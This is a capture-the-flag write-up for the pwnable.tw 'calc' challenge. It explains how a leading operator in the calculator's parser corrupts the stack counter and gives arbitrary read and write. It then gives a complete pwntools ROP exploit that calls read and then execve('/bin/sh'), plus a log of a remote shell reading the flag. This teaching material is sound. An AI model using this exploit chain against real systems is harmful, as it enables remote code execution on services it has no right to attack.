---
title: "[PWNABLE.TW] - calc"
date: 2025-03-30 6:55:00
tags:
  - PWN
category: "Wargame"
---
This is a pretty terrible challenge for people who are not good at reverse engineering. And I had to watch the write up to solve this challenge. But in the end, what I got was a little improvement in my reverse engineering skills.

## Challenge Information
Description: `Have you ever use Microsoft calculator?`

Instance: `nc chall.pwnable.tw 10100`

Tags:
- Arbitrary Read
- Arbitrary Write
- ROP

## Reverse Engineering

So let's playing with `checksec` first:

```sh
[*] '/mnt/e/sec/lab/pwnable.tw/calc/calc'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Look at the result we know this is a `i386` binary with `Canary` and no `PIE`. The `PIE` is disable so we don't need to worry about the address because it's fixed. So next, let's decompile this binary in IDA and analysis:

### main function

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

Pretty simple, this function call `calc` function and make sure that the binary doesn't run more than 1 minute. Next we will dive into `calc` function. (This function have 2 important function so I just show these 2 function)

### calc function

```c
unsigned int calc()
{
  int pool[101]; // [esp+18h] [ebp-5A0h] BYREF
  char expr[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(expr, 0x400u);
    if ( !get_expr(expr, 1024) )
      break;
    init_pool(pool);
    if ( parse_expr(expr, pool) )
    {
      printf("%d\n", pool[pool[0]]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v3;
}
```

#### get_expr function

```c
int __cdecl get_expr(_BYTE *expr, int size)
{
  int v2; // eax
  char expression; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  i = 0;
  while ( i < size && read(0, &expression, 1) != -1 && expression != '\n' )
  {
    if ( expression == '+'
      || expression == '-'
      || expression == '*'
      || expression == '/'
      || expression == '%'
      || expression > '/' && expression <= '9' )
    {
      v2 = i++;
      expr[v2] = expression;
    }
  }
  expr[i] = 0;
  return i;
}
```

Its main function is to receive expressions from the user. It requires the user to enter numbers and mathematical operations. And then it saves our input to `expr` variable

#### parse_expr function

```c
int __cdecl parse_expr(char *expr, int *pool)
{
  int v3; // eax
  char *token_start; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int v6; // [esp+28h] [ebp-80h]
  int *token_length; // [esp+2Ch] [ebp-7Ch]
  char *number_str; // [esp+30h] [ebp-78h]
  int number; // [esp+34h] [ebp-74h]
  _BYTE operator[100]; // [esp+38h] [ebp-70h] BYREF
  unsigned int canary; // [esp+9Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  token_start = expr;
  v6 = 0;
  bzero(operator, 0x64u);
  for ( i = 0; ; ++i )
  {
    if ( expr[i] - (unsigned int)'0' > 9 )
    {
      token_length = (int *)(&expr[i] - token_start);
      number_str = (char *)malloc((char *)token_length + 1);
      memcpy(number_str, token_start, token_length);
      number_str[(_DWORD)token_length] = 0;
      if ( !strcmp(number_str, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
      number = atoi(number_str);
      if ( number > '\0' )
      {
        v3 = (*pool)++;
        pool[v3 + 1] = number;
      }
      if ( expr[i] && expr[i + 1] - (unsigned int)'0' > 9 )
      {
        puts("expression error!");
        fflush(stdout);
        return 0;
      }
      token_start = &expr[i + 1];
      if ( operator[v6] )
      {
        switch ( expr[i] )
        {
          case '%':
          case '*':
          case '/':
            if ( operator[v6] != 43 && operator[v6] != 45 )
              goto LABEL_14;
            operator[++v6] = expr[i];
            break;
          case '+':
          case '-':
LABEL_14:
            eval(pool, operator[v6]);
            operator[v6] = expr[i];
            break;
          default:
            eval(pool, operator[v6--]);
            break;
        }
      }
      else
      {
        operator[v6] = expr[i];
      }
      if ( !expr[i] )
        break;
    }
  }
  while ( v6 >= 0 )
    eval(pool, operator[v6--]);
  return 1;
}
```

This is the function that takes care of the main job for a simulation computer. In this function, it will process the expression we enter from the previous function. So let me break down the main parts of this function.

```c
token_start = expr;
v6 = 0;
bzero(operator, 0x64u);
for ( i = 0; ; ++i )
{
  if ( expr[i] - (unsigned int)'0' > 9 )
  {
    token_length = (int *)(&expr[i] - token_start);
    number_str = (char *)malloc((char *)token_length + 1);
    memcpy(number_str, token_start, token_length);
    number_str[(_DWORD)token_length] = 0;
```

All of this code are run inside the for loop. So first, it loops through each character in the expression. Each time, the function checks if the current character is not a digit `(expr[i] - (unsigned int)'0' > 9)`. If the character is a number, the function splits it into a token.

- `token_length = (int *)(&expr[i] - token_start)`: Calculates the length of the current token by calculating the difference between the current character position and token_start.

- `number_str = (char *)malloc((char *)token_length + 1)`: Allocates memory for the number string `number_str` with a size corresponding to the length of the token.

- `memcpy(number_str, token_start, token_length)`: Copies the substring from expr to `number_str`.

- `number_str[(int)token_length] = 0`: Adds the terminator character (`\0`) to the end of `number_str`.

```c
if (!strcmp(number_str, "0"))
{
  puts("prevent division by zero");
  fflush(stdout);
  return 0;
}
number = atoi(number_str);
```
- If the string is "0", the function will print the message `prevent division by zero` and terminate the function, avoiding the division by zero error.

- If it is not "0", the string will be converted to an integer using `atoi()`.

```c
if (number > '\0')
{
  v3 = (*pool)++;
  pool[v3 + 1] = number;
}
```

This is the important one and have some special things here. For easy, it'll look like this

```c
if (number > 0) {
    v3 = pool[0];
    pool[0]++;
    pool[v3 + 1] = number
}
```

So for example, let say we want to calculate this expression `10+12`. This code will work like this:

```sh
v3 = pool[0] = 0
pool[0] = pool[0] + 1 = 1
pool[v3 + 1] = pool[0 + 1] = pool[1] = 10

v3 = pool[0] = 1
pool[0] = pool[0] + 1 = 2
pool[v3 + 1] = pool[1 + 1] = pool[2] = 12

-> pool = [2, 10, 12]
```

That's what these code work, I choose this explain because I had read many write-ups before to solve this and i get stuck on this line of code the most. So in the `parse_expr` function, `pool[0]` stores the number of elements (numbers) that will be calculated from the expression (in this case, it will be 2). The function checks each character in the expression to see if it's a number. If it is a number, it adds it to `pool` and moves to the next character. When it finds an operator, it checks the rules and calls the `eval()` function to calculate the result of the numbers in pool, updating the operator and storing the result. Therefore, it’s not just about adding numbers to pool, but also handling operators and calling `eval()` to calculate the numbers when an operator is found.

In summary (in this example), the function starts by scanning the expression from left to right. When it encounters the characters 1 and 0, it recognizes them as a number and forms the number `10`, which is then stored in the `pool` array. Specifically, `pool[1]` will hold the value 10. Next, the function encounters the operator `+` and stores it in the `operator` array. After processing the operator, the function moves on to the next number, which is `12`. Just like `10`, the number `12` is stored in `pool[2]`. Once the entire expression is processed, the function checks the `+` operator in the operator array and calls the `eval` function to perform the calculation between the two numbers in the pool.

##### eval function

```c
int *__cdecl eval(int *pool, char n47)
{
  int *pool_1; // eax

  if ( n47 == '+' )
  {
    pool[*pool - 1] += pool[*pool];
  }
  else if ( n47 > '+' )
  {
    if ( n47 == '-' )
    {
      pool[*pool - 1] -= pool[*pool];
    }
    else if ( n47 == '/' )
    {
      pool[*pool - 1] /= pool[*pool];
    }
  }
  else if ( n47 == '*' )
  {
    pool[*pool - 1] *= pool[*pool];
  }
  pool_1 = pool;
  --*pool;
  return pool_1;
}
```

This function will calculate our expression. I'll use our old example `10+12`. When that expression go to this function, it'll work like this

```sh
pool[0] = 2
pool[1] = 10
pool[2] = 12

pool[*pool - 1] += pool[*pool]
-> pool[pool[0] - 1] += pool[pool[0]]
-> pool[2 - 1] += pool[2]
-> pool[1] += pool[2]
-> pool[1] = pool[1] + pool[2] = 10 + 12 = 21
-> pool[1] = 21

pool[0] = pool[0] - 1 = 2 - 1 = 1
--> print out pool[pool[0]] (or pool[1])
```

We can see that our result will store at pool[1] and the program will print it out for us

### Dynamic Analysis

```sh
=== Welcome to SECPROG calculator ===
1+1
2
2+1
3
2-1
1
+2
0
+500
0
+499
0
+500-1
-1
+500+1
0
```

We see it work nice but some expressions didn't show the result as our expectation. So let's take a look again. If we input `+500`, it will break the expression processing logic of the program. So in the pool it will happen like this

```sh
pool[0] = 1
pool[1] = 500
```

And because the operator is at the first of our expression all of this expression will come to `eval` function:

```sh
pool[0] = 1
pool[1] = 500

pool[*pool - 1] += pool[*pool]
-> pool[0] = pool[0] + pool[1]
-> pool[0] = 501

pool[0] = pool[0] - 1 = 500

-> print out the value at pool[500]
```

So with this we can arbitrary read permission, and we can arbitrary write too, this one work like the example above. For example, if you want to write `0xcafebabe` to pool[500], you just need to do `+500+3405691582`.

```sh
pool[0] = 1
pool[1] = 500

pool[*pool - 1] += pool[*pool]
-> pool[0] = pool[0] + pool[1]
-> pool[0] = 501

pool[0] = pool[0] - 1 = 500

pool[0] = 501
pool[501] = 3405691582

pool[*pool - 1] += pool[*pool]
-> pool[500] = pool[500] + pool[501]
-> pool[500] = 3405691582

--> print out pool[pool[0] - 1]
```

## Exploit Development

With the above information, it will be easier for us to write the exploit. But first we need to find the offset from the pool to the saved EIP of the main. To do that we set a breakpoint when the program above to call `parse_expr` function:

```c
EBP  0xffffcdd8 —▸ 0xffffcdf8 —▸ 0x8049c30 (__libc_csu_fini) ◂— push ebx
ESP  0xffffc820 —▸ 0xffffc9cc ◂— '+381+134678656'
<...>
00:0000│ esp 0xffffc820 —▸ 0xffffc9cc ◂— '+381+134678656'
01:0004│-5b4 0xffffc824 —▸ 0xffffc838 ◂— 0                      <--------------- pool
02:0008│-5b0 0xffffc828 ◂— 0
03:000c│-5ac 0xffffc82c ◂— 0
04:0010│-5a8 0xffffc830 ◂— 0
05:0014│-5a4 0xffffc834 ◂— 0
06:0018│-5a0 0xffffc838 ◂— 0
07:001c│-59c 0xffffc83c ◂— 0
pwndbg> p/x 0xffffcdf8+4
$4 = 0xffffcdfc
pwndbg> p/x (0xffffcdfc-0xffffc838)/4
$5 = 0x171
pwndbg> p/d
$6 = 369
```

But when we check it again:

```c
pwndbg> x/xw 0xffffcdf8+4
0xffffcdfc:     0x0804967a
pwndbg> x/xw 0xffffc838 + 369*4 + 4
0xffffce00:     0x00000001
```

pool[369] isn't point to main's saved EIP, so we need to calculate again

```c
pwndbg> x/xw 0xffffcdf8+4
0xffffcdfc:     0x0804967a
pwndbg> x/xw 0xffffc838 + 369*4 + 4
0xffffce00:     0x00000001
pwndbg> p/x (0xffffce00-0xffffcdfc)/4
$2 = 0x1
```

And finally the offset is `0x170` or `368`. And then the final stage is write a payload to send the payload (My payload just work from high offset -> low offset)

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./calc', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, aslr=False)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

gdbscript = '''

# b *0x80493ED
# b *0x8049144
# b *eval
b *0x8049433
c
'''.format(**locals())

p = start()

# ==================== EXPLOIT ====================

offset = [0]
def parse(value) -> bytes:

    curr_offset = offset[0] + 360 # offset to reach return address
    offset[0] += 1
    return bytes(f'+{curr_offset}+{value}'.encode('utf-8'))

def exploit():

    pop_ecx_ebx = 0x080701d1  # pop ecx; pop ebx; ret;
    pop_eax = 0x080bc545      # pop eax; ret;
    bss = 0x80ecf80
    pop_esi = 0x0804a095      # pop esi; ret;
    xchg_ecx = 0x080e2141     # xchg ecx, eax; or cl, byte ptr [esi]; adc al, 0x41; ret;


    read = [
        parse(pop_ecx_ebx),
        parse(bss),
        parse(0),
        parse(pop_esi),
        parse(bss),
        parse(0x080e4a79), # xchg ebx, eax
        parse(0x080701aa), # pop edx
        parse(0x100),
        parse(pop_eax),
        parse(0x03),
        parse(0x08070880), # int 0x80; ret
    ]


    execve = [
        parse(pop_esi),
        parse(bss + 100),

        parse(0x080550d0), # xor eax, eax
        parse(xchg_ecx),

        parse(0x080481d1), # pop ebx
        parse(bss),

        parse(0x080550d0), # xor eax, eax
        parse(0x080ae7cc), # xchg edx, eax

        parse(pop_eax),
        parse(0x0b),

        parse(0x08070880), # int 0x80; ret
    ]


    # print(read)
    # print(execve)
    pl = read + execve

    for p in pl[::-1]:
        print(f'Write {p}')
        sl(p)
        print(rl())

    sl(b'')
    sl(b'/bin/sh\x00')

    interactive()

if __name__ == '__main__':
    exploit()
```

**P/s: For some reason (IDK) why but my payload doesn't work with the offset pool -> eip of main 🥹, so I chance to pool -> eip of calc**

## Get flag

```sh
[+] Opening connection to chall.pwnable.tw on port 10100: Done
Write b'+381+134678656'
b'=== Welcome to SECPROG calculator ===\n'
Write b'+380+11'
b'134678656\n'
Write b'+379+134989125'
b'-620113526\n'
Write b'+378+134932428'
b'-939325995\n'
Write b'+377+134566096'
b'269452284\n'
Write b'+376+135188352'
b'269750492\n'
Write b'+375+134513105'
b'135188352\n'
Write b'+374+135143745'
b'269026177\n'
Write b'+373+134566096'
b'135143745\n'
Write b'+372+135188452'
b'134566096\n'
Write b'+371+134520981'
b'130398688\n'
Write b'+370+134678656'
b'129731209\n'
Write b'+369+3'
b'134678657\n'
Write b'+368+134989125'
b'134518397\n'
Write b'+367+256'
b'269508981\n'
Write b'+366+134676906'
b'135184652\n'
Write b'+365+135154297'
b'134676906\n'
Write b'+364+135188352'
b'269667369\n'
Write b'+363+134520981'
b'130398588\n'
Write b'+362+0'
b'269038793\n'
Write b'+361+135188352'
b'prevent division by zero\n'
Write b'+360+134676945'
b'269706265\n'
[*] Switching to interactive mode
129887033
$ cat /home/calc/flag*
FLAG{C:\Windows\System32\calc.exe}
```
